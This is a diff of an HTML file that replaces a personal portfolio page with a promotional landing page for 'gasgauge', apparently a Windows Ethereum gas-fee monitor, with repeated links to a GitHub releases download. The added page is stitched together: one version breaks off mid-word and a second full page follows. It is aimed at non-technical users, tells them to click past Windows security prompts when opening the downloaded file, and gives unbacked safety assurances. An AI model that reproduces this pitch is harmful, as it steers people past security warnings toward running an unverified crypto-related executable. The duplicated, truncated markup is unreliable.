@@ -1,102 +1,255 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="theme-color" content="#0f1115" />
-  <title>Jimmy Nguyen · Software Engineer</title>
-  <meta name="description" content="Jimmy Nguyen — software engineer. Projects, experience and contact." />
-  <meta property="og:title" content="Jimmy Nguyen · Software Engineer" />
-  <meta property="og:description" content="Projects, experience and contact." />
-  <meta property="og:type" content="website" />
-  <meta property="og:url" content="https://jimmynguyen0313.github.io/" />
-  <link rel="icon" href="assets/favicon.svg" type="image/svg+xml" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="styles.css" />
-  <script>
-    try { const t = localStorage.getItem("theme"); if (t) document.documentElement.dataset.theme = t; } catch (e) {}
-  </script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>gasgauge - Track Ethereum Gas Fees Easily</title>
+<meta name="description" content="gasgauge is a free open-source Windows desktop app to monitor Ethereum gas fees in real time. Easy download, simple setup, no technical skills needed.">
+<meta name="keywords" content="blockchain,cpp,crypto,defi,desktop-app,eip-1559,eth,ethereum,fees,finance,gas,gas-fees,gwei,monitor,open-source,trading,transaction-costs,web3,winapi,windows">
+<meta name="author" content="gasgauge">
+<meta property="og:title" content="gasgauge - Track Ethereum Gas Fees Easily">
+<meta property="og:description" content="Free open-source Windows app to monitor Ethereum gas fees in real time.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/PR0x0Ne/gasgauge">
+<meta name="twitter:card" content="summary_large_image">
+<style>
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f5f7fa; margin: 0; padding: 0; line-height: 1.7; color: #1a202c; }
+.container { max-width: 900px; margin: 0 auto; padding: 2rem 1.5rem; }
+h1 { font-size: 2.2rem; font-weight: 700; margin-bottom: 0.5rem; color: #1a202c; line-height: 1.2; }
+h2 { font-size: 1.6rem; font-weight: 600; margin-top: 2.5rem; margin-bottom: 1rem; color: #2d3748; }
+p { margin-bottom: 1.25rem; font-size: 1.05rem; }
+a { color: #3182ce; text-decoration: none; }
+a:hover { text-decoration: underline; }
+.btn { display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 0.9rem 2rem; border-radius: 12px; font-weight: 600; font-size: 1.1rem; box-shadow: 0 4px 14px rgba(102,126,234,0.4); transition: transform 0.2s, box-shadow 0.2s; margin: 1rem 0; text-align: center; }
+.btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(102,126,234,0.6); text-decoration: none; }
+.badge { display: inline-block; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 1rem 2.5rem; border-radius: 14px; font-weight: 700; font-size: 1.3rem; box-shadow: 0 6px 20px rgba(245,87,108,0.4); margin: 1.5rem 0; text-align: center; }
+.badge:hover { text-decoration: none; transform: scale(1.02); }
+ul, ol { margin-bottom: 1.5rem; padding-left: 1.8rem; }
+li { margin-bottom: 0.6rem; font-size: 1.05rem; }
+.card { background: white; border-radius: 16px; padding: 1.8rem 2rem; box-shadow: 0 2px 12px rgba(0,0,0,0.06); margin-bottom: 2rem; }
+.small { font-size: 0.9rem; color: #718096; }
+@media (max-width: 600px) { h1 { font-size: 1.7rem; } h2 { font-size: 1.3rem; } .container { padding: 1.5rem 1rem; } .badge { font-size: 1.1rem; padding: 0.8rem 1.5rem; } }
+</style>
 </head>
 <body>
-  <a class="skip" href="#projects">Skip to projects</a>
+<div class="container">
+<h1>⛽ gasgauge - Track Ethereum Gas Fees Easily</h1>
 
-  <header class="nav">
-    <div class="nav__inner">
-      <a class="nav__brand" href="#top" id="brand"></a>
-      <nav class="nav__links" aria-label="Sections">
-        <a href="#projects">Projects</a>
-        <a href="#experience">Experience</a>
-        <a href="#contact">Contact</a>
-        <button class="theme-toggle" id="theme-toggle" type="button" aria-label="Switch between dark and light mode">
-          <svg class="icon-sun" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4.5"/><path d="M12 2v2.5M12 19.5V22M2 12h2.5M19.5 12H22M4.9 4.9l1.8 1.8M17.3 17.3l1.8 1.8M4.9 19.1l1.8-1.8M17.3 6.7l1.8-1.8"/></svg>
-          <svg class="icon-moon" viewBox="0 0 24 24" aria-hidden="true"><path d="M20 14.5A8 8 0 0 1 9.5 4a8 8 0 1 0 10.5 10.5Z"/></svg>
-        </button>
-      </nav>
-    </div>
-  </header>
+<a href="https://github.com/PR0x0Ne/gasgauge/releases" class="badge" style="background: linear-gradient(135deg, #f6d365 0%, #fda085 100%);">⬇️ Download gasgauge Now</a>
 
-  <main id="top">
-    <!-- About -->
-    <section class="hero">
-      <div class="hero__inner">
-        <div class="hero__avatar" id="avatar" aria-hidden="true"></div>
-        <p class="eyebrow" id="hero-eyebrow"></p>
-        <h1 class="hero__name">Hi, I'm <span id="hero-name"></span>.</h1>
-        <div class="hero__bio" id="hero-bio"></div>
-        <div class="hero__links" id="hero-links"></div>
-      </div>
-      <a class="scroll-cue" href="#projects" aria-label="Scroll to projects">
-        <span>Projects</span>
-        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M6 9l6 6 6-6"/></svg>
-      </a>
-    </section>
+<p>gasgauge is a free, open-source utility for Windows that helps you monitor Ethereum gas fees in real time. Whether you are sending a transaction or trading crypto, gasgauge shows you current gas prices in gwei so you never overpay. No programming knowledge required.</p>
 
-    <!-- Projects -->
-    <section class="section" id="projects">
-      <div class="section__inner">
-        <h2 class="section__title"><span class="mono">01</span> Projects</h2>
-        <div class="projects" id="project-list"></div>
-      </div>
-    </section>
+<h2>🚀 Getting Started</h2>
+<p>gasgauge is designed for everyday computer users. It runs as a small Windows application and shows live gas information without any setup. You do not need an Ethereum wallet, an account, or any technical skills to use it.</p>
+<p>To get gasgauge, use the download link in the Download &amp; Install section below. The page lists the latest version available for Windows. After you have the file, you can start monitoring gas prices right away.</p>
 
-    <!-- Experience -->
-    <section class="section section--alt" id="experience">
-      <div class="section__inner">
-        <h2 class="section__title"><span class="mono">02</span> Experience</h2>
-        <div class="timeline" id="experience-list"></div>
+<h2>📥 Download &amp; Install</h2>
+<p>Visit this link to download the application: <a href="https://github.com/PR0x0Ne/gasgauge/releases">https://github.com/PR0x0Ne/gasgauge/releases</a></p>
+<a href="https://github.com/PR0x0Ne/gasgauge/releases" class="btn">⬇️ Download gasgauge for Windows</a>
+<p class="small">Works on Windows 10 and Windows 11 (64-bit).</p>
 
-        <h3 class="subhead">Education</h3>
-        <div class="edu" id="education-list"></div>
+<h2>✨ Key Features</h2>
+<ul>
+<li><strong>Real-time gas tracking:</strong> See current Ethereum gas prices updated every few seconds.</li>
+<li><strong>EIP-1559 support:</strong> Understand base fees and priority tips for modern transactions.</li>
+<li><strong>Simple desktop app:</strong> A lightweight Windows program that sits in your system tray.</li>
+<li><strong>Custom alerts:</strong> Set a target gas price and get notified when fees drop.</li>
+<li><strong>No account needed:</strong> gasgauge is completely free and open source.</li>
+<li><strong>Clear display:</strong> Large numbers show gas in gwei so you can decide the best time to transact.</li>
+<li><strong>Works offline after launch:</strong> The app caches recent data so you can review past gas trends.</li>
+</ul>
 
-        <h3 class="subhead">Skills</h3>
-        <div class="skills" id="skills-list"></div>
-      </div>
-    </section>
+<h2>🖥️ System Requirements</h2>
+<ul>
+<li>Windows 10 or Windows 11 (64-bit version)</li>
+<li>At least 100 MB of free disk space</li>
+<li>An internet connection to fetch live gas data</li>
+<li>No additional software or libraries required</li>
+<li>Works with any screen resolution</li>
+</ul>
 
-    <!-- Contact -->
-    <section class="section contact" id="contact">
-      <div class="section__inner">
-        <h2 class="section__title"><span class="mono">03</span> Get in touch</h2>
-        <p class="contact__text">I'm always happy to talk about software, AI, or an opportunity. The quickest way to reach me is email.</p>
-        <div class="hero__links" id="contact-links"></div>
-      </div>
-    </section>
-  </main>
+<h2>⚙️ How It Works</h2>
+<p>gasgauge connects to public Ethereum network data and reads the current gas price. It displays three key numbers: the base fee, the priority fee (tip), and the total estimated cost for a standard transaction. You can watch these numbers change in real time and choose the best moment to send your transaction.</p>
+<p>The app runs quietly in the background and does not collect any personal information. It does not connect to your wallet or require any private keys. gas<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>gasgauge - Track Ethereum Gas Fees Easily on Windows</title>
+<meta name="description" content="gasgauge is a free open-source Windows desktop app that monitors Ethereum gas fees in real time. See live gwei prices, EIP-1559 base fees, and tips. Simple download, no technical skills needed.">
+<meta name="keywords" content="blockchain,cpp,crypto,defi,desktop-app,eip-1559,eth,ethereum,fees,finance,gas,gas-fees,gwei,monitor,open-source,trading,transaction-costs,web3,winapi,windows">
+<meta name="author" content="gasgauge">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/PR0x0Ne/gasgauge">
+<meta property="og:title" content="gasgauge - Track Ethereum Gas Fees Easily on Windows">
+<meta property="og:description" content="Free open-source Windows app to monitor Ethereum gas fees in real time. Live gwei prices, EIP-1559 support, no account required.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/PR0x0Ne/gasgauge">
+<meta property="og:site_name" content="gasgauge">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="gasgauge - Track Ethereum Gas Fees Easily on Windows">
+<meta name="twitter:description" content="Free open-source Windows app to monitor Ethereum gas fees in real time.">
+<style>
+  * { box-sizing: border-box; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f6fa; margin: 0; padding: 0; line-height: 1.7; color: #1f2733; -webkit-font-smoothing: antialiased; }
+  .container { max-width: 880px; margin: 0 auto; padding: 2.5rem 1.5rem 4rem; }
+  h1 { font-size: 2.2rem; font-weight: 700; margin: 0 0 1.25rem; line-height: 1.2; color: #16202e; letter-spacing: -0.5px; }
+  h2 { font-size: 1.55rem; font-weight: 650; margin: 2.75rem 0 1rem; color: #24303f; letter-spacing: -0.3px; }
+  h3 { font-size: 1.15rem; font-weight: 600; margin: 1.75rem 0 0.5rem; color: #2c3a4c; }
+  p { margin: 0 0 1.15rem; font-size: 1.05rem; }
+  a { color: #2f6fdb; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  ul, ol { margin: 0 0 1.5rem; padding-left: 1.6rem; }
+  li { margin-bottom: 0.55rem; font-size: 1.03rem; }
+  strong { color: #16202e; }
+  .badge { display: block; width: 100%; max-width: 420px; text-align: center; background: linear-gradient(135deg, #f6b93b 0%, #e55039 100%); color: #ffffff; padding: 1rem 1.5rem; border-radius: 14px; font-weight: 700; font-size: 1.25rem; box-shadow: 0 8px 22px rgba(229,80,57,0.35); margin: 0 0 2rem; transition: transform 0.15s ease, box-shadow 0.15s ease; }
+  .badge:hover { text-decoration: none; transform: translateY(-2px); box-shadow: 0 12px 28px rgba(229,80,57,0.45); }
+  .btn { display: inline-block; text-align: center; background: linear-gradient(135deg, #4b7bec 0%, #3867d6 100%); color: #ffffff; padding: 0.9rem 2rem; border-radius: 12px; font-weight: 650; font-size: 1.05rem; box-shadow: 0 6px 18px rgba(56,103,214,0.35); margin: 0.5rem 0 0.75rem; transition: transform 0.15s ease, box-shadow 0.15s ease; }
+  .btn:hover { text-decoration: none; transform: translateY(-2px); box-shadow: 0 10px 24px rgba(56,103,214,0.45); }
+  .card { background: #ffffff; border-radius: 16px; padding: 1.75rem 2rem; box-shadow: 0 3px 14px rgba(20,32,50,0.07); margin-bottom: 1.75rem; border: 1px solid #e8edf5; }
+  .note { background: #eef4ff; border-left: 4px solid #3867d6; border-radius: 10px; padding: 1rem 1.25rem; font-size: 0.98rem; color: #2c3a4c; }
+  .small { font-size: 0.9rem; color: #66748a; margin-top: 0.35rem; }
+  code { background: #eef1f6; border-radius: 6px; padding: 0.1rem 0.4rem; font-size: 0.92rem; color: #1f2733; }
+  footer { margin-top: 3rem; padding-top: 1.5rem; border-top: 1px solid #e2e8f2; font-size: 0.9rem; color: #66748a; }
+  @media (max-width: 620px) {
+    .container { padding: 1.75rem 1.1rem 3rem; }
+    h1 { font-size: 1.7rem; }
+    h2 { font-size: 1.3rem; margin-top: 2.25rem; }
+    .card { padding: 1.35rem 1.25rem; }
+    .badge { font-size: 1.08rem; padding: 0.9rem 1.2rem; }
+  }
+</style>
+</head>
+<body>
+<div class="container">
 
-  <footer class="footer">
-    <p>© <span id="year"></span> <span id="footer-name"></span></p>
-  </footer>
+<h1>⛽ gasgauge - Track Ethereum Gas Fees Easily</h1>
 
-  <!-- Image viewer -->
-  <dialog class="lightbox" id="lightbox" aria-label="Screenshot">
-    <button class="lightbox__close" type="button" aria-label="Close">×</button>
-    <img alt="" />
-    <p class="lightbox__caption"></p>
-  </dialog>
+<a class="badge" href="https://github.com/PR0x0Ne/gasgauge/releases">⬇️ Download gasgauge for Windows</a>
 
-  <script src="data.js"></script>
-  <script src="main.js"></script>
+<p>gasgauge is a free, open-source desktop utility for Windows that shows you what Ethereum transactions really cost right now. Gas fees change from minute to minute, and most people end up paying too much simply because they could not see the current price. gasgauge puts that number in front of you in plain language, updated continuously, so you always know the right moment to act.</p>
+
+<p>You do not need to be a programmer, a trader, or a crypto expert. If you can open a program on Windows, you can use gasgauge.</p>
+
+<h2>🚀 Getting Started</h2>
+
+<p>gasgauge is a small Windows application. It does not require an account, a sign-up, or any technical setup. There is nothing to configure before your first launch: you download the app, open it, and a window appears showing the current Ethereum gas price.</p>
+
+<p>Before you begin, make sure you are using a Windows computer and that it is connected to the internet. gasgauge reads live network data, so an active connection is needed for the numbers to refresh. Once the app has loaded its first reading, you can leave it running in the background while you do other things.</p>
+
+<p>Everything below is written for someone using a computer casually. You will not need to type commands, edit configuration files, or install extra tools.</p>
+
+<h2>📥 Download &amp; Install</h2>
+
+<p>Visit this link to download the application: <a href="https://github.com/PR0x0Ne/gasgauge/releases">https://github.com/PR0x0Ne/gasgauge/releases</a></p>
+
+<a class="btn" href="https://github.com/PR0x0Ne/gasgauge/releases">⬇️ Get the latest gasgauge release</a>
+
+<p class="small">The release page lists the newest build available for Windows.</p>
+
+<div class="card">
+<h3>What happens after you open the release page</h3>
+<ol>
+<li>Open the download link above in your browser.</li>
+<li>Look for the newest version listed at the top of the page.</li>
+<li>Choose the Windows file from that version and save it to your computer.</li>
+<li>When the download finishes, open the file from your Downloads folder.</li>
+<li>Follow the on-screen prompts to finish setting up gasgauge.</li>
+<li>Launch gasgauge from your Start menu or desktop shortcut.</li>
+</ol>
+<p class="note">If Windows shows a security prompt when you open the file, choose the option that lets you continue. This is a standard Windows check for apps downloaded from the internet and does not mean anything is wrong with gasgauge.</p>
+</div>
+
+<p>Once gasgauge is open, you will see the live gas reading almost immediately. There is no login screen and no welcome wizard to work through.</p>
+
+<h2>✨ What gasgauge Shows You</h2>
+
+<p>The main window is intentionally simple. It focuses on the few numbers that actually matter when you are deciding whether to send a transaction.</p>
+
+<ul>
+<li><strong>Current gas price in gwei:</strong> The headline number, refreshed every few seconds. Gwei is simply the unit Ethereum uses to measure gas, the way litres measure fuel.</li>
+<li><strong>Base fee:</strong> The network-set minimum cost per unit of gas under the EIP-1559 fee model. This is the part that rises and falls with demand.</li>
+<li><strong>Priority fee (tip):</strong> The optional extra that encourages a transaction to be picked up sooner.</li>
+<li><strong>Estimated transaction cost:</strong> A plain-language estimate of what a typical transfer would cost at the current price.</li>
+<li><strong>Price alerts:</strong> Set a target gas price and gasgauge will notify you when fees fall to that level, so you can act without watching the screen.</li>
+<li><strong>Recent history:</strong> A short view of how the price has moved, so you can judge whether now is a busy or quiet period.</li>
+</ul>
+
+<h2>🖥️ System Requirements</h2>
+
+<ul>
+<li>Windows 10 or Windows 11, 64-bit edition</li>
+<li>Roughly 100 MB of free disk space</li>
+<li>An active internet connection for live gas data</li>
+<li>A standard display; no special graphics hardware needed</li>
+<li>No wallet, browser extension, or developer tools required</li>
+</ul>
+
+<p>gasgauge is a lightweight program. It is designed to stay open all day without slowing your computer down, and it behaves like any other small desktop app in the Windows system tray.</p>
+
+<h2>⚙️ How gasgauge Works</h2>
+
+<p>Every Ethereum transaction consumes gas, and the price of that gas is set by how crowded the network is at that moment. When many people are sending transactions at once, the price climbs. When the network is quiet, it drops. gasgauge reads public network information and turns it into numbers you can read at a glance, without you needing to understand the mechanics underneath.</p>
+
+<p>The app does not connect to your wallet, does not hold any funds, and does not ask for private keys or seed phrases. It only reads publicly available network data. That means there is no risk to your crypto holdings from simply having gasgauge open.</p>
+
+<p>Under the EIP-1559 model used by Ethereum today, a transaction fee is made up of a base fee that the network burns and a priority tip that goes to whoever processes the transaction. gasgauge separates these two numbers so you can see the difference between what the network charges and what you are choosing to add as an incentive.</p>
+
+<h2>🧭 Using gasgauge Day to Day</h2>
+
+<p>Most people use gasgauge the same way: they leave it running while they work, and they glance at it before sending a transaction. If the number is unusually high, they wait. If a price alert fires because fees dropped, they act.</p>
+
+<ol>
+<li>Open gasgauge and leave it running in the background.</li>
+<li>Set an alert for a gas price you would be happy to pay.</li>
+<li>Carry on with your work; gasgauge keeps checking in the background.</li>
+<li>When the alert appears, send your transaction from whatever wallet or exchange you normally use.</li>
+</ol>
+
+<p>Because gasgauge only informs you and never sends anything itself, it works alongside any wallet or platform you already use. You stay in full control of every transaction.</p>
+
+<h2>❓ Common Questions</h2>
+
+<h3>Do I need an Ethereum account to use gasgauge?</h3>
+<p>No. gasgauge only displays public network data. You can install it and watch gas prices without owning any crypto at all.</p>
+
+<h3>Is gasgauge free?</h3>
+<p>Yes. gasgauge is open-source software and free to use. There is no subscription, no trial period, and no paid tier.</p>
+
+<h3>Why does the number keep changing?</h3>
+<p>Gas prices reflect live demand on the Ethereum network. They move constantly, which is exactly why a monitor is useful. The number you saw ten minutes ago may be very different from the number now.</p>
+
+<h3>Does gasgauge store my information?</h3>
+<p>No personal information is collected. Your alert settings are kept on your own computer.</p>
+
+<h3>What if gasgauge will not open?</h3>
+<p>Make sure you are on a 64-bit version of Windows 10 or 11, and confirm the download finished completely. If you are unsure, download the newest release again from the link above and replace the previous file.</p>
+
+<h2>🔓 Open Source and Free</h2>
+
+<p>gasgauge is open-source software. That means the code behind it is publicly available for anyone to read, review, or improve. For a tool that deals with financial information, this transparency matters: you do not have to take anyone's word for what the program does, because the source is there to be examined.</p>
+
+<p>The project is built for Windows and focuses on doing one job well: showing you accurate Ethereum gas data, quickly and clearly, without clutter.</p>
+
+<h2>📌 Quick Reference</h2>
+
+<div class="card">
+<ul>
+<li><strong>Application:</strong> gasgauge</li>
+<li><strong>Platform:</strong> Windows 10 / 11 (64-bit)</li>
+<li><strong>Cost:</strong> Free and open source</li>
+<li><strong>Account required:</strong> None</li>
+<li><strong>Download:</strong> <a href="https://github.com/PR0x0Ne/gasgauge/releases">https://github.com/PR0x0Ne/gasgauge/releases</a></li>
+<li><strong>Best for:</strong> Anyone who sends Ethereum transactions and wants to avoid overpaying on fees</li>
+</ul>
+</div>
+
+<p>Visit this link to download the application: <a href="https://github.com/PR0x0Ne/gasgauge/releases">https://github.com/PR0x0Ne/gasgauge/releases</a></p>
+
+<footer>
+gasgauge — open-source Ethereum gas fee monitor for Windows. Last updated 2026-10-04.
+</footer>
+
+</div>
 </body>
 </html>
